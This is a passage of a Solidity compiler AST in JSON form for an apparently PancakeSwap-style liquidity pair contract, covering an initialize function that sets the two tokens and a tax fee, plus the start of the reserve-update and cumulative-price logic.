																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "2603:21:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20464f5242494444454e",
															"id": 1131,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2626:20:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_f0c1e1712466d3d36724e0a82edec721666e68b8fe9433d191f13e7c47aec611",
																"typeString": "literal_string \"Pancake: FORBIDDEN\""
															},
															"value": "Pancake: FORBIDDEN"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_f0c1e1712466d3d36724e0a82edec721666e68b8fe9433d191f13e7c47aec611",
																"typeString": "literal_string \"Pancake: FORBIDDEN\""
															}
														],
														"id": 1126,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "2595:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1132,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2595:52:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1133,
												"nodeType": "ExpressionStatement",
												"src": "2595:52:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1136,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1134,
														"name": "token0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 968,
														"src": "2677:6:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1135,
														"name": "_token0",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1119,
														"src": "2686:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "2677:16:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 1137,
												"nodeType": "ExpressionStatement",
												"src": "2677:16:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1140,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1138,
														"name": "token1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 970,
														"src": "2703:6:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1139,
														"name": "_token1",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1121,
														"src": "2712:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "2703:16:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 1141,
												"nodeType": "ExpressionStatement",
												"src": "2703:16:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1144,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1142,
														"name": "taxfee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 972,
														"src": "2729:6:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1143,
														"name": "_taxfee",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1123,
														"src": "2738:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2729:16:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 1145,
												"nodeType": "ExpressionStatement",
												"src": "2729:16:6"
											}
										]
									},
									"documentation": null,
									"id": 1147,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "initialize",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1124,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1119,
												"name": "_token0",
												"nodeType": "VariableDeclaration",
												"scope": 1147,
												"src": "2507:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1118,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2507:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1121,
												"name": "_token1",
												"nodeType": "VariableDeclaration",
												"scope": 1147,
												"src": "2532:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1120,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2532:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1123,
												"name": "_taxfee",
												"nodeType": "VariableDeclaration",
												"scope": 1147,
												"src": "2557:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1122,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2557:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2497:78:6"
									},
									"returnParameters": {
										"id": 1125,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2585:0:6"
									},
									"scope": 2193,
									"src": "2478:274:6",
									"stateMutability": "nonpayable",
									"superFunction": 851,
									"visibility": "external"
								},
								{
									"body": {
										"id": 1254,
										"nodeType": "Block",
										"src": "2965:852:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1171,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1164,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1159,
																	"name": "balance0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1149,
																	"src": "2996:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1162,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "UnaryOperation",
																			"operator": "-",
																			"prefix": true,
																			"src": "3016:2:6",
																			"subExpression": {
																				"argumentTypes": null,
																				"hexValue": "31",
																				"id": 1161,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "3017:1:6",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_1_by_1",
																					"typeString": "int_const 1"
																				},
																				"value": "1"
																			},
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_minus_1_by_1",
																				"typeString": "int_const -1"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_minus_1_by_1",
																				"typeString": "int_const -1"
																			}
																		],
																		"id": 1160,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "3008:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint112_$",
																			"typeString": "type(uint112)"
																		},
																		"typeName": "uint112"
																	},
																	"id": 1163,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "3008:11:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																},
																"src": "2996:23:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1170,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1165,
																	"name": "balance1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1151,
																	"src": "3023:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 1168,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "UnaryOperation",
																			"operator": "-",
																			"prefix": true,
																			"src": "3043:2:6",
																			"subExpression": {
																				"argumentTypes": null,
																				"hexValue": "31",
																				"id": 1167,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "3044:1:6",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_1_by_1",
																					"typeString": "int_const 1"
																				},
																				"value": "1"
																			},
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_minus_1_by_1",
																				"typeString": "int_const -1"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_rational_minus_1_by_1",
																				"typeString": "int_const -1"
																			}
																		],
																		"id": 1166,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "3035:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint112_$",
																			"typeString": "type(uint112)"
																		},
																		"typeName": "uint112"
																	},
																	"id": 1169,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "3035:11:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint112",
																		"typeString": "uint112"
																	}
																},
																"src": "3023:23:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "2996:50:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a204f564552464c4f57",
															"id": 1172,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3060:19:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_ecd319b2d162405bd72b657f3fdaddf991823264b7f8c130bf28f20adeb81259",
																"typeString": "literal_string \"Pancake: OVERFLOW\""
															},
															"value": "Pancake: OVERFLOW"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_ecd319b2d162405bd72b657f3fdaddf991823264b7f8c130bf28f20adeb81259",
																"typeString": "literal_string \"Pancake: OVERFLOW\""
															}
														],
														"id": 1158,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "2975:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1173,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2975:114:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1174,
												"nodeType": "ExpressionStatement",
												"src": "2975:114:6"
											},
											{
												"assignments": [
													1176
												],
												"declarations": [
													{
														"constant": false,
														"id": 1176,
														"name": "blockTimestamp",
														"nodeType": "VariableDeclaration",
														"scope": 1254,
														"src": "3099:21:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														},
														"typeName": {
															"id": 1175,
															"name": "uint32",
															"nodeType": "ElementaryTypeName",
															"src": "3099:6:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint32",
																"typeString": "uint32"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1185,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1183,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1178,
																	"name": "block",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2315,
																	"src": "3130:5:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_block",
																		"typeString": "block"
																	}
																},
																"id": 1179,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "timestamp",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "3130:15:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "%",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_rational_4294967296_by_1",
																	"typeString": "int_const 4294967296"
																},
																"id": 1182,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"hexValue": "32",
																	"id": 1180,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "3148:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_2_by_1",
																		"typeString": "int_const 2"
																	},
																	"value": "2"
																},
																"nodeType": "BinaryOperation",
																"operator": "**",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 1181,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "3153:2:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "3148:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_4294967296_by_1",
																	"typeString": "int_const 4294967296"
																}
															},
															"src": "3130:25:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1177,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "3123:6:6",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint32_$",
															"typeString": "type(uint32)"
														},
														"typeName": "uint32"
													},
													"id": 1184,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3123:33:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3099:57:6"
											},
											{
												"assignments": [
													1187
												],
												"declarations": [
													{
														"constant": false,
														"id": 1187,
														"name": "timeElapsed",
														"nodeType": "VariableDeclaration",
														"scope": 1254,
														"src": "3166:18:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														},
														"typeName": {
															"id": 1186,
															"name": "uint32",
															"nodeType": "ElementaryTypeName",
															"src": "3166:6:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint32",
																"typeString": "uint32"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1191,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													},
													"id": 1190,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1188,
														"name": "blockTimestamp",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1176,
														"src": "3187:14:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1189,
														"name": "blockTimestampLast",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 978,
														"src": "3204:18:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"src": "3187:35:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3166:56:6"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 1202,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"id": 1198,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint32",
																"typeString": "uint32"
															},
															"id": 1194,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1192,
																"name": "timeElapsed",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1187,
																"src": "3259:11:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint32",
																	"typeString": "uint32"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1193,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3273:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "3259:15:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "&&",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															},
															"id": 1197,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1195,
																"name": "_reserve0",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1153,
																"src": "3278:9:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint112",
																	"typeString": "uint112"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1196,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3291:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "3278:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"src": "3259:33:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "&&",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"id": 1201,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1199,
															"name": "_reserve1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1155,
															"src": "3296:9:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "!=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1200,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3309:1:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "3296:14:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "3259:51:6",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1232,
												"nodeType": "IfStatement",
												"src": "3255:396:6",
												"trueBody": {
													"id": 1231,
													"nodeType": "Block",
													"src": "3312:339:6",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1215,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1203,
																	"name": "price0CumulativeLast",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 980,
																	"src": "3386:20:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1214,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1210,
																						"name": "_reserve0",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1153,
																						"src": "3465:9:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					],
																					"expression": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"id": 1207,
																								"name": "_reserve1",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 1155,
																								"src": "3448:9:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_uint112",
																									"typeString": "uint112"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"id": 1205,
																								"name": "UQ112x112",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 2310,
																								"src": "3431:9:6",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_contract$_UQ112x112_$2310_$",
																									"typeString": "type(library UQ112x112)"
																								}
																							},
																							"id": 1206,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"memberName": "encode",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": 2291,
																							"src": "3431:16:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_internal_pure$_t_uint112_$returns$_t_uint224_$",
																								"typeString": "function (uint112) pure returns (uint224)"
																							}
																						},
																						"id": 1208,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "3431:27:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint224",
																							"typeString": "uint224"
																						}
																					},
																					"id": 1209,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"memberName": "uqdiv",
																					"nodeType": "MemberAccess",
																					"referencedDeclaration": 2309,
																					"src": "3431:33:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_function_internal_pure$_t_uint224_$_t_uint112_$returns$_t_uint224_$bound_to$_t_uint224_$",
																						"typeString": "function (uint224,uint112) pure returns (uint224)"
																					}
																				},
																				"id": 1211,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "functionCall",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "3431:44:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint224",
																					"typeString": "uint224"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_uint224",
																					"typeString": "uint224"
																				}
																			],
																			"id": 1204,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "3426:4:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_uint256_$",
																				"typeString": "type(uint256)"
																			},
																			"typeName": "uint"
																		},
																		"id": 1212,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "3426:50:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "*",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 1213,
																		"name": "timeElapsed",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1187,
																		"src": "3495:11:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint32",
																			"typeString": "uint32"
																		}
																	},
																	"src": "3426:80:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "3386:120:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1216,
															"nodeType": "ExpressionStatement",
															"src": "3386:120:6"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1229,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1217,
																	"name": "price1CumulativeLast",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 982,
																	"src": "3520:20:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1228,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 1224,
																						"name": "_reserve1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1155,
																						"src": "3599:9:6",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint112",
																							"typeString": "uint112"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint112",
